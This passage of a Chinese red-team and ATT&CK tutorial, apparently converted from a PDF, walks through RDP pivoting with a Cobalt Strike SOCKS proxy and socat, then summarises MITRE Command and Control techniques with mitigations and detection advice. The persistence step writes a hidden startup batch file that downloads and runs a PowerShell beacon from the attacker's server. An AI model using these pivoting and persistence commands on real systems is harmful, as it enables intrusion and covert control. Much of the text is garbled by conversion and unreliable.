设置自己的团队服务器 在RDP 跳转前，先打通命令与控制的通道。设置SOCKS
代理。远程自己的服务器，就等于直接远程目标主机，这里就需要设置代理来实现流量的跳转。
我给你钱让你帮忙把钱给到我朋友那里，你拿到钱把钱给到了我的朋友，就等于我的钱直接到了朋友那里。
> beacon\> socks 1337
安装socat & proxychains 修改proxychains.conf 127.0.0.1:1337 运行socat
与proxychains 的命令
> proxychains socat TCP4-LISTEN:3389,fork TCP4:10.0.0.100:3389
监听 3389 流量，重定向到 10.0.0.100:3389
SSH 进入自己的团队服务器，任何使用 3389 的流量都到了 10.0.0.100:3389。
攻击者到互联网中自己的服务器，通过socks 代理，将 3389
流量重定向到目标工作站。你连接自己的服务器，就跳转了一下到目标的工作站的远程端口上面。
使用自己的电脑发起C2 指令，我们通过rastamouseadm 账户进入到了jump box
网络环境里了。
-   坚持（持久性）
设置一个持久性元素，当账户的主人登陆时，获得SMB Beacon，关于SMB Beacon
可阅读文末参考资料：SMB Beacon 这是一个非常简单的例子：
> 创建无阶段PowerShell SMB Beacon
> 有效负载。将它托管在您的Teamserver（网络传送）上/smb。
>
> Reverse Port Foward 在我们当前的灯塔上创建一个- \>rportfwd 8080
> 178.62.56.134 8
>
> 0
>
> C:\\Users\\rasta_mouse_adm\\AppData\\Roaming\\Microsoft\\Windows\\Start
> Menu\\Pr ograms\\Startup\\startup.bat 使用以下内容创建：powershell.exe
> -nop -w hidden -c \"i ex ((new-object
> net.webclient).downloadstring(\'http://10.0.1.200:8080/smb\'))\"
>
> 注销RDP 会话。
创建有效载荷，放到自己团队服务器上/smb，设置反向端口转发。当真正的用户登录时，我们会在我们的博客中看到一个消息。
-   进入secret 网络
手法一样，设置RDP 跳转。
参 考 资 料 ： 利 用 RDP 跳 跃 网 络 隔 离 ：
https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/ SMB
Beacon：
https://github.com/aleenzz/CobaltStrikewiki/blob/master/%E7%AC%AC%E
4%B8%89%E8%8A%82%5BSMB%20Beacon%5D.md
# 九.C&C Command and Control
> 攻击者正试图与受损的系统通信以控制它们。
>
> 指挥和控制由一些技术组成，对手可以使用这些技术在受害者网络中与他们控制的系统通信。对手通常试图模仿正常的、预期的流量，以避免被发现。敌人可以通过多\>种方式建立指挥和控制，并根据受害者的网络结构和防御能力进行不同程度的隐身。
## 、常用的端口
> 攻击者可以通过一个常用的端口进行通信，以绕过防火墙或网络检测系
> 统，并与正常的网络活动混合，以避免更详细的检查。它们可以使用通常打开的端口，比如
-   TCP:80 (HTTP)
-   TCP:443 (HTTPS)
-   TCP:25 (SMTP)
-   TCP/UDP:53 (DNS)
> 它们可以使用与端口相关联的协议，也可以使用完全不同的协议。对于在一个enclave
> 内部发生的连接(例如代理或主节点与其他节点之间的连
>
> 接)，常见端口的示例如下:
-   TCP/UDP:135 (RPC)
-   TCP/UDP:22 (SSH)
-   TCP/UDP:3389 (RDP) 1.1.1、缓解措施
缓解 描述
网络
使用网络签名来识别特定恶意软件流量的网络入侵检测和预防系统可用于入侵
减轻网络级别的活动。签名通常用于协议中的唯一指示符，并且可能基于的预
特定对手或工具使用的特定协议，并且可能在不同的恶意软件家族和版本防
中有所不同。随着时间的推移，对手可能会更改工具C2 签名，或者以避
> 免被常见防御工具发现的方式构建协议。
>
> \| 网络分割 \|
> 配置内部和外部防火墙，使用与特定网络段可能不需要的网络协议相关联的公共端口来阻塞流量。
2.  、举例说明
名称 描述
ADVSTORESHE LL
ADVSTORESHELL 的变体尝试在端口 443 上通过HTTP 与C2 服务器通信。
APT18 APT18 使用端口 80 进行C2 通信。
APT19 APT19 为C2 使用TCP 端口 80。
APT29 APT29 为C2 使用了端口号 443。
APT3 APT3 使用常用端口(如HTTPS/443)执行命令和控制。APT32 APT32 使用端口
80 进行C2 通信。
APT33 APT33 使用端口 443 进行命令和控制。
APT37 APT37 已经将端口 8080 用于C2。AuditCred AuditCred 将端口号 443
用于C2 通信。BADCALL BADCALL 为C2 使用端口 8000 和 443。
BadPatch BadPatch 使用端口 26 进行C2 通信。
BBSRAT BBSRAT HTTP TCP 端口 80 和HTTPS TCP 端口 443 进行通
> 信。
Bisonal Bisonal 使用 443 进行C2 通信。
Briba Briba 通过端口 443 连接到外部C2 基础设施。
Calisto Calisto 试图使用端口 80 通过TCP 与C2 服务器联系。Carbanak
Calisto 试图使用端口 80 通过TCP 与C2 服务器联系。Carbon Carbanak 为C2
服务器使用端口号 443 和 80。
3.  、检测
> 为不常见的数据流分析网络数据(例如，客户机发送的数据明显多于从服务器接收的数据)。使用通常没有网络通信或从未见过的网络的进程是可疑的。分析数据包内容，以检测不符合所使用端口的预期协议行为的通信。
4.  、Detection
> 分析不常见数据流的网络数据（例如，客户端发送的数据明显多于从服务器接收的数据）。
> 利用通常不具有网络通信或从未见过的网络的过程是可疑的。
> 分析数据包内容以检测不遵循正在使用的端口的预期协议行为的通信。
链接：[Commonly Used Port](https://attack.mitre.org/techniques/T1043/)
## 、通过移动媒体进行通信
> 在可能断开连接的网络上，使用可移动媒体将命令从一个系统传输到另一个系统，敌手可以在受攻击的主机之间执行命令和控制。这两个系统都需要被破坏，首先破坏的可能是联网的系统，其次是通过可移动媒体复制的横向移动。命令和文件将从断开连接的系统中继到对手可以直接访问的internet
> 连接系统。
1.  、缓解措施
缓解 描述
禁用或删除功能或程序
如果没有必要，禁用自动toruns。
操作系统配置
如果业务操作不需要可移动媒体，则在组织策略级别上不允许或限制它们。
2.  、举例
名称 描述
APT28 APT28 使用一种工具，通过受感染的USB
从漏气的计算机上捕获信息，并在插入USB 时将信息传输到联网的计算机上。
CHOPSTIC K
APT28 的部分操作包括使用CHOPSTICK
模块将自己复制到有空气间隙的机器上，使用写在u
盘上的文件来传输数据和命令流量。
USBSteale r
3.  、检测
USBStealer
将第二个受害者的命令放到插入到第一个受害者的可移动媒体驱动器上，当驱动器插入到第二个受害者时执行命令。
监控可移动媒体上的文件访问。检测可移动媒体安装时执行的进程。1.2.4、Detection
监视可移动媒体上的文件访问。
检测安装可移动介质时执行的进程。链接：[Communication Through Removable
Media](https://attack.mitre.org/techniques/T1092/)
## 、连接代理
> 连接代理用于引导系统之间的网络流量，或充当网络通信的中介。有许多工具可以通过代理或端口重定向来支持流量重定向，包括HTRAN、ZXProxy
> 和ZXPortMap。
>
> 代理的定义还可以扩展为包含网络之间的信任关系，包括点对点(peer-
> to-peer)、网格(mesh)或由主机或系统组成的网络之间的可信连接。
>
> 网络可能位于单个组织内，也可能位于具有信任关系的组织之间。对手可以使用这些类型的关系来管理命令和控制通信，减少同时出站的网络连接数量，在连接丢失时提供弹性，或者利用受害者之间现有的可信通信路径来避免怀疑。
1.  、Mitigations
Mitigation Description
网络入侵防御
使用网络签名来识别特定恶意软件的流量的网络入侵检测和防御系统可用于缓解网络级别的活动。
签名通常用于协议内的唯一指示符，并且可以基于特定攻击者或工具使用的特定C2
协议，并且可能在各种恶意软件系列和版本之间不同。
攻击者可能会随着时间的推移改变工
具C2 签名或构建协议，以避免被常见的防御工具检测到。1.3.2、Examples
Name Description
APT2 8
APT28
使用其他受害者作为代理来传递命令流量，例如使用受损的格鲁吉亚军事电子邮件服务器作为北约受害者的跳跃点。
该组还使用了一个工具作为代理，即使受害者在路由器后面也允许C2。 APT28
还使用一台机器来中继和模糊CHOPSTICK 与其服务器之间的通信。
2.  、Detection
> 利用通常不具有网络通信或从未见过的网络的过程是可疑的。
> 从通常需要用户指导的流程中解除与用户驱动的操作无关的网络活动是可疑的。
> 分析不常见数据流的网络数据（例如，客户端发送的数据明显多于从服务器或在不应该或通常不相互通信的客户端之间发送的数据）。
> 利用通常不具有网络通信或从未见过的网络的过程是可疑的。
> 分析数据包内容以检测不遵循正在使用的端口的预期协议行为的通信。
链接：[Connection Proxy](https://attack.mitre.org/techniques/T1090/)
## 、自定义命令和控制协议
> 攻击者可以使用自定义命令和控制协议进行通信，而不是在现有的标准应用层协议中封装命令/数据。
> 实现包括模仿众所周知的协议或在TCP / IP
> /另一个标准网络堆栈提供的基本协议之上开发自定义协议（包括原始套接字）。
1.  、Mitigations
Mitigation Description
Filter Network Traffic
过滤网络流量以查找异常或非标准协议。
Network Intrusion Prevention
Network Segmentation
2.  、Examples
使用网络签名来识别特定恶意软件的流量的网络入侵检测和防御系统可用于缓解网络级别的活动。
签名通常用于协议内的唯一指示符，并且可以基于特定对手或工具使用的特定协议，并且可能在各种恶意软件系列和版本之间不同。
攻击者可能会随着时间的推移改变工具C2
签名或构建协议，以避免被常见的防御工具检测到。
正确配置防火墙和代理，以限制仅通过必要端口和适当的网络网关系统的传出流量。
还要确保仅配置主机以通过授权接口进行通信。
Name Description
APT32 APT32 使用Cobalt Strike 的可延展C2 功能来融入网络流量。
该组的后门还可以通过在DNS
数据包的子域字段中对其进行编码来对数据进行泄露。 此外，该组的一个macOS
后门实现了涉及随机值的C2 数据包的特定格式。
Cobalt Strike
Cobalt Strike 允许攻击者修改"信标"有效载荷通信的方式。 这在Cobalt Strike
手册中被称为"Malleable C2"，旨在让渗透测试团队模仿已知的APT C2 方法。
Duqu 能够通过端口 443 使用其命令和控制协议。但是，Duqu
还能够通过标准应用层协议封装其命令协议。 Duqu
命令和控制协议实现了许多与TCP 相同的功能，是一种可靠的传输协议。
3.  、Detection
> 分析ICMP
> 消息或包含异常数据的其他协议的网络流量，或者通常在网络内部或网络中看不到的网络流量。
> 分析不常见数据流的网络数据（例
>
> 如，客户端发送的数据明显多于从服务器接收的数据）。
> 利用通常不具有网络通信或从未见过的网络的过程是可疑的。
> 分析数据包内容以检测
>
> 不遵循正在使用的端口的预期协议行为的通信。 监视和调查与启用和/
> 或利用备用通信通道相关的功能的API 调用。
链接：[Custom Command and Control
Protocol](https://attack.mitre.org/techniques/T1094/)
## 、自定义加密协议
> 攻击者可以使用自定义加密协议或算法来隐藏命令和控制流量。
> 一个简单的方案，例如用固定密钥对明文进行异或，将产生一个非常弱的密文。自定义加密方案的复杂程度可能不同。
> 恶意软件样本的分析和逆向工程可能足以发现所使用的算法和加密密钥。
> 一些攻击者还可能尝试实现他们自己版本的众所周知的加密算法，而不是使用已知的实现库，这可能导致无意的错误。
1.  、Mitigations
Mitigation Description
Network Intrusion Prevention
使用网络签名来识别特定恶意软件的流量的网络入侵检测和防御系统可用于缓解网络级别的活动。
由于使用的自定义协议可能不符合典型的协议标准，因此可能有机会在网络级别签署流量以进行检测。
签名通常用于协议内的唯一指示符，并且可以基于特定对手或工具使用的特定协议，并且可能在各种恶意软件系列和版本之间不同。
攻击者可能会随着时间的推移改变工具C2
签名或构建协议，以避免被常见的防御工具检测到。
2.  、Examples